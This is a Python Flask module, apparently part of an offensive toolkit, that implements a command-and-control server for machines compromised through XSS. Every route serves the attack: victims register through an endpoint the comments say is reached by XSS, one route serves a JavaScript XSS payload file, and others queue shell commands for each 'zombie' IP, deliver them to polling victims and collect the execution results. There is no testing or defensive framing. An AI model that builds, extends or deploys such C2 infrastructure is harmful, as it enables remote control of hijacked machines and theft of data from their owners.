from flask import Blueprint, jsonify, request, render_template, redirect, url_for, flash
import os
import json
from config.config import log_function_call, LogConfig
from instance.models import web_shell_back_point, db
from datetime import datetime

control_bp = Blueprint('control', __name__)


@control_bp.route('/add_message', methods=['POST', 'GET'])  # type: ignore
@log_function_call()
def add_message():
    try:
        logger = LogConfig.get_context_logger()

        if request.method == 'POST':
            logger.info("用戶請求添加消息 (POST)")
            # 使用 request.form 獲取表單數據
            message = request.form.get('message')
            target_ip = request.form.get('target_ip') or request.remote_addr
        elif request.method == 'GET':
            logger.info("用戶使用GET方法上傳消息 (可能通過XSS)")
            # 使用 request.args 獲取 URL 參數
            message = request.args.get('message')
            target_ip = request.args.get('target_ip')
        if not message:
            if request.method == 'GET':
                return jsonify({'error': '消息不能為空', 'help': '使用方式: /add_message?message=你的消息&target_ip=目標IP'}), 400
            else:
                flash('消息不能為空！', 'error')
                return redirect(url_for('control.get_messages'))

        # 檢查是否已存在相同的 target_ip
        existing_record = web_shell_back_point.query.filter_by(
            target_ip=target_ip).first()

        if existing_record:
            # 更新現有記錄
            existing_record.target_config = message
            existing_record.created_at = datetime.now()
            db.session.commit()
            logger.info(f"更新現有記錄，目標IP: {target_ip}")
        else:
            # 創建新記錄
            new_message = web_shell_back_point(
                target_ip=target_ip,
                target_config=message,
                created_at=datetime.now()
            )
            db.session.add(new_message)
            db.session.commit()
            logger.info(f"創建新記錄，目標IP: {target_ip}")
        logger.info(
            f"消息添加成功，目標IP: {target_ip},消息: {message},時間: {datetime.now()}")
        if request.method == 'GET':
            return jsonify({
                'status': 'success',
                'message': '消息添加成功！',
                'data': {
                    'target_ip': target_ip,
                    'message': message,
                    'timestamp': datetime.now().isoformat()
                }
            }), 200
        else:
            flash('消息添加成功！', 'success')
            return redirect(url_for('control.get_messages'))

    except Exception as e:
        logger.error(f"添加消息時發生錯誤: {e}")
        if request.method == 'GET':
            return jsonify({'error': str(e)}), 500
        else:
            flash(f'發生錯誤: {str(e)}', 'error')
            return redirect(url_for('control.get_messages'))


@control_bp.route('/get_messages', methods=['GET'])  # type: ignore
@log_function_call()
def get_messages():
    try:
        logger = LogConfig.get_context_logger()
        logger.info("用戶請求獲取消息")
        messages = web_shell_back_point.query.all()
        if not messages:
            return render_template('C2_control/control_message.html', messages=[])
        return render_template('C2_control/control_message.html', messages=messages)
    except Exception as e:
        logger.error(f"獲取消息時發生錯誤: {e}")
        return jsonify({'error': str(e)}), 500


@control_bp.route('/help', methods=['GET'])  # type: ignore
@log_function_call()
def help_page():
    """
    顯示 C2 控制面板的 HTML 格式使用說明和 API 文檔
    """
    try:
        logger = LogConfig.get_context_logger()
        logger.info("用戶請求查看幫助頁面")

        # 從JSON文件讀取幫助信息
        # 獲取當前文件的目錄路徑
        current_dir = os.path.dirname(os.path.abspath(__file__))
        config_path = os.path.join(current_dir, 'control_help.json')

        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                help_info = json.load(f)
        except FileNotFoundError:
            logger.error(f"找不到幫助配置文件: {config_path}")
            flash('幫助配置文件不存在', 'error')
            return redirect(url_for('control.get_messages'))
        except json.JSONDecodeError as e:
            logger.error(f"解析JSON配置文件失敗: {e}")
            flash('JSON配置文件格式錯誤', 'error')
            return redirect(url_for('control.get_messages'))

        # 總是返回HTML格式
        return render_template('C2_control/help.html', help_info=help_info)

    except Exception as e:
        logger.error(f"顯示幫助頁面時發生錯誤: {e}")
        flash(f'發生錯誤: {str(e)}', 'error')
        return redirect(url_for('control.get_messages'))


@control_bp.route('/xss_payload', methods=['GET'])  # type: ignore
@log_function_call()
def xss_payload():
    """
    返回XSS攻擊用的JavaScript載荷
    """
    try:
        logger = LogConfig.get_context_logger()
        logger.info("用戶請求XSS載荷文件")
        # 獲取當前文件的目錄路徑
        current_dir = os.path.dirname(os.path.abspath(__file__))
        payload_path = os.path.join(current_dir, 'first_payload.js')

        with open(payload_path, 'r', encoding='utf-8') as f:
            payload_content = f.read()

            # 設置正確的Content-Type
        from flask import Response
        return Response(
            payload_content,
            mimetype='application/javascript',
            headers={'Content-Type': 'application/javascript; charset=utf-8'}
        )

    except Exception as e:
        logger.error(f"載入XSS載荷時發生錯誤: {e}")
        return Response(
            '// XSS載荷載入失敗',
            mimetype='application/javascript'
        )


@control_bp.route('/get_command', methods=['GET'])  # type: ignore
@log_function_call()
def get_command():
    try:
        logger = LogConfig.get_context_logger()
        logger.info("肉雞請求獲取命令")
        zombie_ip = request.args.get('zombie_ip') or request.remote_addr
        command_record = web_shell_back_point.query.filter_by(
            target_ip=zombie_ip).first()
        if not command_record or not command_record.to_do_command:
            return jsonify({'data': '沒有命令'})
        return jsonify({'data': command_record.to_do_command})
    except Exception as e:
        logger.error(f"獲取命令時發生錯誤: {e}")
        return jsonify({'error': str(e)}), 500


@control_bp.route('/get_zombies', methods=['GET'])  # type: ignore
@log_function_call()
def get_zombies():
    """
    獲取所有殭屍機器列表
    """
    try:
        logger = LogConfig.get_context_logger()
        logger.info("用戶請求獲取殭屍機器列表")

        # 獲取所有獨特的目標IP
        zombies = db.session.query(
            web_shell_back_point.target_ip).distinct().all()
        zombie_list = [zombie[0] for zombie in zombies if zombie[0]]

        return jsonify({
            'status': 'success',
            'zombies': zombie_list,
            'count': len(zombie_list)
        })
    except Exception as e:
        logger.error(f"獲取殭屍機器列表時發生錯誤: {e}")
        return jsonify({'error': str(e)}), 500


# type: ignore
@control_bp.route('/add_command_to_do/<zombie_ip>', methods=['POST'])
@log_function_call()
def add_command_to_do(zombie_ip):
    """
    為指定的殭屍機器添加待執行命令 (僅支持POST方法)
    """
    try:
        logger = LogConfig.get_context_logger()
        logger.info(f"用戶請求為殭屍機器 {zombie_ip} 添加命令")

        # 檢查殭屍機器是否存在
        zombie_record = web_shell_back_point.query.filter_by(
            target_ip=zombie_ip).first()
        if not zombie_record:
            return jsonify({'error': f'殭屍機器 {zombie_ip} 不存在'}), 404

        # 獲取命令內容
        command = request.form.get('command') or request.args.get('command')
        if not command:
            return jsonify({'error': '命令不能為空'}), 400

        # 更新命令
        zombie_record.to_do_command = command
        zombie_record.updated_at = datetime.now()
        db.session.commit()

        logger.info(f"成功為殭屍機器 {zombie_ip} 添加命令: {command}")
        return jsonify({
            'status': 'success',
            'message': f'成功為 {zombie_ip} 添加命令：{command}'
        })

    except Exception as e:
        logger.error(f"添加命令時發生錯誤: {e}")
        return jsonify({'error': str(e)}), 500


@control_bp.route('/send_result', methods=['POST'])
@log_function_call()
def send_result():
    try:
        logger = LogConfig.get_context_logger()
        zombie_ip = request.remote_addr
        result = request.form.get('result')
        if not result:
            return jsonify({'error': '結果不能為空'}), 400

        # 查找或創建殭屍機器記錄
        zombie_record = web_shell_back_point.query.filter_by(
            target_ip=zombie_ip).first()

        if not zombie_record:
            # 如果殭屍機器不存在，創建一個基本記錄
            zombie_record = web_shell_back_point(
                target_ip=zombie_ip,
                target_config=f"自動創建記錄 - 來自結果上傳",
                created_at=datetime.now()
            )
            db.session.add(zombie_record)
            logger.info(f"自動創建殭屍機器記錄: {zombie_ip}")

        # 更新結果
        zombie_record.target_report = result
        db.session.commit()
        logger.info(f"成功為殭屍機器 {zombie_ip} 發送結果: {result}")
        return jsonify({'status': 'success', 'message': '結果發送成功'})
    except Exception as e:
        logger.error(f"發送結果時發生錯誤: {e}")
        return jsonify({'error': str(e)}), 500


# type: ignore
@control_bp.route('/get_zombie_details/<zombie_ip>', methods=['GET'])
@log_function_call()
def get_zombie_details(zombie_ip):
    """
    獲取指定殭屍機器的詳細信息和執行結果
    """
    try:
        logger = LogConfig.get_context_logger()
        logger.info(f"用戶請求查看殭屍機器 {zombie_ip} 的詳細信息")

        # 查找殭屍機器記錄
        zombie_record = web_shell_back_point.query.filter_by(
            target_ip=zombie_ip).first()

        if not zombie_record:
            return jsonify({'error': f'殭屍機器 {zombie_ip} 不存在'}), 404

        # 解析target_config（註冊信息）
        target_info = {}
        if zombie_record.target_config:
            try:
                target_info = json.loads(zombie_record.target_config)
            except json.JSONDecodeError:
                target_info = {'raw_data': zombie_record.target_config}

        # 解析target_report（命令執行結果）
        execution_results = []
        if zombie_record.target_report:
            try:
                # 嘗試解析為JSON
                result_data = json.loads(zombie_record.target_report)
                if isinstance(result_data, list):
                    execution_results = result_data
                else:
                    execution_results = [result_data]
            except json.JSONDecodeError:
                # 如果不是JSON，作為純文本處理
                execution_results = [{
                    'command': 'Unknown',
                    'output': zombie_record.target_report,
                    'timestamp': zombie_record.created_at.isoformat() if zombie_record.created_at else None,
                    'success': True
                }]

        return jsonify({
            'status': 'success',
            'zombie_ip': zombie_ip,
            'registration_info': target_info,
            'current_command': zombie_record.to_do_command,
            'execution_results': execution_results,
            'created_at': zombie_record.created_at.isoformat() if zombie_record.created_at else None,
            'last_seen': zombie_record.created_at.isoformat() if zombie_record.created_at else None
        })

    except Exception as e:
        logger.error(f"獲取殭屍機器詳細信息時發生錯誤: {e}")
        return jsonify({'error': str(e)}), 500
